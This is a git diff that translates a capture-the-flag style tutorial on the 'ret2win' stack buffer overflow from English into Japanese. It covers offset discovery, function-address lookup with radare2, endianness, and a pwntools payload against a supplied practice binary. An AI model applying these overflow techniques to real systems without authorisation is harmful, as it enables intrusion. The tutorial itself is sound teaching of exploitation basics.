@@ -4,36 +4,36 @@ description: The most basic binexp challenge
 
 # ret2win
 
-A **ret2win** is simply a binary where there is a `win()` function (or equivalent); once you successfully redirect execution there, you complete the challenge.
+**ret2win** とは、`win()` 関数(またはそれに相当するもの)があるバイナリのことで、実行をそこへうまくリダイレクトできればチャレンジ達成です。
 
-To carry this out, we have to leverage what we learnt in the **introduction**, but in a _predictable manner_ - we have to overwrite EIP, but to a specific value of our choice.
+これを実現するには、**導入**で学んだことを活用しますが、今度は_狙いどおりに_行う必要があります。つまり、EIP を上書きするだけでなく、自分が選んだ特定の値で上書きしなければなりません。
 
-To do this, what do we need to know? Well, a couple things:
+そのために知っておくべきことは次の 2 つです。
 
-* The padding _until_ we begin to overwrite the return pointer (EIP)
-* What value we want to overwrite EIP to
+* リターンポインタ(EIP)を上書きし始めるまでの_パディング_
+* EIP を上書きしたい値
 
 {% hint style="warning" %}
-When I say "overwrite EIP", I mean overwrite the saved return pointer that gets popped into EIP. The EIP register is not located on the stack, so it is not overwritten directly.
+「EIP を上書きする」と言うとき、実際には EIP に pop されるスタック上の、保存されたリターンポインタを上書きすることを指しています。EIP レジスタ自体はスタック上にないので、直接上書きされるわけではありません。
 {% endhint %}
 
 {% file src="../../.gitbook/assets/ret2win.zip" %}
 ret2win
 {% endfile %}
 
-### Finding the Padding
+### パディングを見つける
 
-This can be found using simple trial and error; if we send a variable numbers of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force (we'll cover this in the next post), but it'll do for now.
+これは単純な試行錯誤で見つけられます。文字数を変えながら送り、`Segmentation Fault` というメッセージと radare2 を組み合わせて、EIP を上書きできたタイミングを判断します。単純なブルートフォースよりも良い方法があります(次の記事で扱います)が、今のところはこれで十分です。
 
 {% hint style="info" %}
-You may get a segmentation fault for reasons other than overwriting EIP; use a debugger to make sure the padding is correct.
+EIP の上書き以外の理由でもセグメンテーションフォルトは起こります。デバッガを使って、パディングが正しいことを確認してください。
 {% endhint %}
 
-We get an offset of 52 bytes.
+オフセットは 52 バイトと分かりました。
 
-### Finding the Address
+### アドレスを見つける
 
-Now we need to find the address of the `flag()` function in the binary. This is simple.
+次に、バイナリ内の `flag()` 関数のアドレスを調べます。これは簡単です。
 
 ```
 $ r2 -d -A vuln
@@ -44,26 +44,26 @@ $ afl
 ```
 
 {% hint style="info" %}
-`afl` stands for **A**nalyse **F**unctions **L**ist
+`afl` は **A**nalyse **F**unctions **L**ist の略です
 {% endhint %}
 
-The `flag()` function is at `0x080491c3`.
+`flag()` 関数は `0x080491c3` にあります。
 
-### Using the Information
+### 得られた情報を使う
 
-The final piece of the puzzle is to work out how we can send the address we want. If you think back to the introduction, the `A`s that we sent became `0x41` - which is the ASCII code of `A`. So the solution is simple - let's just find the characters with ascii codes `0x08`, `0x04`, `0x91` and `0xc3`.
+最後の課題は、欲しいアドレスをどうやって送るかです。導入を思い出してください。送った `A` は `0x41` になりました。これは `A` の ASCII コードです。ということは、ASCII コードが `0x08`、`0x04`、`0x91`、`0xc3` の文字を探せばよいことになります。
 
-This is a lot simpler than you might think, because we can specify them in python as hex:
+これは思ったより簡単で、Python では 16 進数のまま指定できます。
 
 ```python
 address = '\x08\x04\x91\xc3'
 ```
 
-And that makes it much easier.
+これでずっと楽になります。
 
-### Putting it Together
+### 組み合わせる
 
-Now we know the padding and the value, let's exploit the binary! We can use [`pwntools`](https://github.com/Gallopsled/pwntools) to interface with the binary (check out the [pwntools posts](../../misc/pwntools/) for a more in-depth look).
+パディングと値が分かったので、バイナリをエクスプロイトしましょう。バイナリとやり取りするには [`pwntools`](https://github.com/Gallopsled/pwntools) が使えます(詳しくは [pwntools の記事](../../misc/pwntools/)を参照してください)。
 
 ```python
 from pwn import *        # This is how we import pwntools
@@ -80,7 +80,7 @@ p.sendline(payload)
 log.info(p.clean())      # Output the "Exploited!" string to know we succeeded
 ```
 
-If you run this, there is one small problem: it won't work. Why? Let's check with a debugger. We'll put in a `pause()` to give us time to attach `radare2` onto the process.
+これを実行すると、小さな問題があって、うまくいきません。なぜでしょうか。デバッガで確認しましょう。`pause()` を入れて、プロセスに `radare2` をアタッチする時間を作ります。
 
 ```python
 from pwn import *
@@ -99,13 +99,13 @@ p.sendline(payload)
 log.info(p.clean())
 ```
 
-Now let's run the script with `python3 exploit.py` and then open up a new terminal window.
+`python3 exploit.py` でスクリプトを実行し、別のターミナルウィンドウを開きます。
 
 ```
 r2 -d -A $(pidof vuln)
 ```
 
-By providing the PID of the process, radare2 hooks onto it. Let's break at the return of `unsafe()` and read the value of the return pointer.
+プロセスの PID を指定すると、radare2 がそのプロセスにフックします。`unsafe()` の return にブレークポイントを置いて、リターンポインタの値を読んでみましょう。
 
 ```
 [0x08049172]> db 0x080491aa
@@ -119,11 +119,11 @@ hit breakpoint at: 80491aa
 [...]
 ```
 
-`0xc3910408` - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is [endianness](https://en.wikipedia.org/wiki/Endianness). Big-endian systems store the **most significant byte** (the byte with the largest value) at the smallest memory address, and this is how we sent them. Little-endian does the opposite ([for a reason](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format)), and most binaries you will come across are little-endian. As far as we're concerned, the byte are stored in _reverse order_ in little-endian executables.
+`0xc3910408` を見て、見覚えはありませんか。送ろうとしたアドレスですが、バイトの順序が逆になっています。この逆転の理由は[エンディアン(endianness)](https://en.wikipedia.org/wiki/Endianness)です。ビッグエンディアンのシステムでは**最上位バイト**(最も大きな値のバイト)を最小のメモリアドレスに格納します。私たちが送ったのはこの形でした。リトルエンディアンはその逆です([理由があります](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format))。出会うバイナリのほとんどはリトルエンディアンです。ここでは、リトルエンディアンの実行ファイルではバイトが_逆順_に格納される、と理解しておけば十分です。
 
-### Finding the Endianness
+### エンディアンを調べる
 
-`radare2` comes with a nice tool called `rabin2` for binary analysis:
+`radare2` には、バイナリ解析用の便利なツール `rabin2` が付属しています。
 
 ```
 $ rabin2 -I vuln
@@ -132,17 +132,17 @@ endian   little
 [...]
 ```
 
-So our binary is **little-endian**.
+つまり、このバイナリは**リトルエンディアン**です。
 
-### Accounting for Endianness
+### エンディアンを考慮する
 
-The fix is simple - reverse the address (you can also remove the `pause()`)
+修正は簡単で、アドレスを逆順にします(`pause()` も消して構いません)。
 
 ```python
 payload += '\x08\x04\x91\xc3'[::-1]
 ```
 
-If you run this now, it will work:
+これで実行すると、うまくいきます。
 
 ```
 $ python3 tutorial.py 
@@ -151,37 +151,37 @@ $ python3 tutorial.py
 [*] Exploited!!!!!
 ```
 
-And wham, you've called the `flag()` function! Congrats!
+これで `flag()` 関数を呼び出せました。おめでとうございます。
 
-### Pwntools and Endianness
+### Pwntools とエンディアン
 
-Unsurprisingly, you're not the first person to have thought "could they possibly make endianness simpler" - luckily, pwntools has a built-in `p32()` function ready for use!
+「エンディアンをもっと簡単に扱えないものか」と考えたのは、あなたが初めてではありません。幸い pwntools には、すぐ使える `p32()` 関数が組み込まれています。
 
 ```python
 payload += '\x08\x04\x91\xc3'[::-1]
 ```
 
-becomes
+は、次のようになります。
 
 ```python
 payload += p32(0x080491c3)
 ```
 
-Much simpler, right?
+ずっと簡単ですね。
 
-The only caveat is that it returns `bytes` rather than a string, so you have to make the padding a byte string:
+唯一の注意点は、戻り値が文字列ではなく `bytes` であることです。そのため、パディングもバイト列にする必要があります。
 
 ```python
 payload = b'A' * 52        # Notice the "b"
 ```
 
-Otherwise you will get a
+そうしないと、次のエラーが出ます。
 
 ```
 TypeError: can only concatenate str (not "bytes") to str
 ```
 
-### Final Exploit
+### 最終的なエクスプロイト
 
 ```python
 from pwn import *            # This is how we import pwntools
